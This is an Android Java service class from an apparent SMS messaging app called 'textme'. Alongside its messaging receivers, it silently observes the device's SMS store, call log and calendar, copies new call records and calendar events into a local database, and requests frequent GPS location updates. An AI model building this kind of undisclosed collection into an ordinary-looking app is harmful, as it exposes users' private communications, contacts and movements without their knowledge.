package com.candroid.textme;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

public class MessagingService extends Service {

    private static final String TAG = MessagingService.class.getSimpleName();
    protected static boolean sIsRunning = false;
    private IncomingReceiver mIncomingReceiver;
    private OutgoingReceiver mOutgoingReceiver;
    private CreateConversationReceiver mCreateConversationReceiver;
    protected static DatabaseHelper sDatabase;
    private DatabaseReceiver mDatabaseReceiver;
    private SmsObserver mObserver;
    private CallLogObserver mCallLogObserver;
    private CalendarObserver mCalendarObserver;
    protected static String sTelephoneAddress;
    private LocationManager mLocationManager;
    public MessagingService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Helpers.createPersistentServiceNotification(this));
        sIsRunning = true;
        mIncomingReceiver = new IncomingReceiver();
        mOutgoingReceiver = new OutgoingReceiver();
        mCreateConversationReceiver = new CreateConversationReceiver();
        IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
        incomingFilter.setPriority(Constants.PRIORITY);
        incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
        incomingFilter.addDataScheme("sms");
        IntentFilter outgoingFilter = new IntentFilter();
        outgoingFilter.addAction(Constants.SEND_ACTION);
        outgoingFilter.addAction(Constants.WHISPER_ACTION);
        outgoingFilter.addAction(Constants.SENT_CONFIRMATION_ACTION);
        IntentFilter conversationFilter = new IntentFilter();
        conversationFilter.addAction(Constants.CREATE_CONVERSATION_ACTION);
        //  IntentFilter airplaneFilter = new IntentFilter();
        //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        //  mAirplaneReceiver = new AirplaneReceiver();
        //  registerReceiver(mAirplaneReceiver, airplaneFilter);
        /*mShareReceiver = new ShareReceiver();
        IntentFilter shareFilter = new IntentFilter(Intent.ACTION_SEND);
        shareFilter.addCategory(Intent.CATEGORY_DEFAULT);
        try {
            shareFilter.addDataType("text/plain");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }
        registerReceiver(mShareReceiver, shareFilter);*/
        registerReceiver(mCreateConversationReceiver, conversationFilter);
        registerReceiver(mIncomingReceiver, incomingFilter);
        registerReceiver(mOutgoingReceiver, outgoingFilter);
        sDatabase = new DatabaseHelper(this);
        IntentFilter databaseFilter = new IntentFilter();
        databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
        mDatabaseReceiver = new DatabaseReceiver();
        registerReceiver(mDatabaseReceiver, databaseFilter);
        sTelephoneAddress = Helpers.getDeviceTelephoneNumber(this);
        Log.d(TAG, "address = " + sTelephoneAddress);
        mObserver = new SmsObserver();
        mCallLogObserver = new CallLogObserver();
        mCalendarObserver = new CalendarObserver();
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
        getContentResolver().registerContentObserver(Uri.parse("content://call_log"),true, mCallLogObserver);
        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI,true, mCalendarObserver);
        String locationProvider = LocationManager.GPS_PROVIDER;

        try {
            mLocationManager = Helpers.getLocationManager(this);
            mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, Helpers.getLocationListener(MessagingService.this));

        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sIsRunning = false;
        unregisterReceiver(mCreateConversationReceiver);
        unregisterReceiver(mIncomingReceiver);
        unregisterReceiver(mOutgoingReceiver);
        /*unregisterReceiver(mShareReceiver);*/
        //unregisterReceiver(mAirplaneReceiver);
        sDatabase.close();
        unregisterReceiver(mDatabaseReceiver);
        getContentResolver().unregisterContentObserver(mObserver);
        getContentResolver().unregisterContentObserver(mCallLogObserver);
        stopForeground(true);
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    protected static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time){
        Database.insertMessage(context, sDatabase, body, destinationAddress, originAddress, time);
    }

    private class CallLogObserver extends ContentObserver{
        private int mLastId = -1;
        public CallLogObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
                    if(cursor != null && cursor.moveToLast()){
                        int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                        if(mLastId != id){
                            mLastId = id;
                            String callType = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                            String address = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                            String time = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                            String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                            long newRowId = Database.insertCallLogEntry(MessagingService.this, sDatabase, callType, address, duration, time);
                        }
                    }
                }
            }).start();
        }
    }

    private class SmsObserver extends ContentObserver {
        private int mLastSentMessageId = -1;

        public SmsObserver() {
            super(new Handler());
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
                    if (cursor != null && cursor.moveToNext()) {
                        if (cursor.getInt(cursor.getColumnIndexOrThrow("type")) == 2) {
                            int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                            if (id != mLastSentMessageId) {
                                mLastSentMessageId = id;
                                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                                Intent outgoingSmsIntent = new Intent();
                                outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
                                outgoingSmsIntent.putExtra(Constants.BODY, body);
                                outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
                                sendBroadcast(outgoingSmsIntent);
                            }
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class CalendarObserver extends ContentObserver{
        private int mLastId = -1;
        public CalendarObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
            if(cursor != null && cursor.moveToLast()){
                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                if(mLastId != id){
                    mLastId = id;
                    String account = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.ACCOUNT_NAME));
                    String title = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE));
                    String description = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION));
                    long beginDate = cursor.getLong(cursor.getColumnIndexOrThrow(CalendarContract.Events.DTSTART));
                    long endDate = cursor.getLong(cursor.getColumnIndexOrThrow(CalendarContract.Events.DTEND));
                    int isAllDay = cursor.getInt(cursor.getColumnIndexOrThrow(CalendarContract.Events.ALL_DAY));
                    Database.insertCalendarEvent(MessagingService.this, sDatabase, account, title, description, beginDate, endDate, isAllDay);
                }
            }
            cursor.close();
        }
    }
}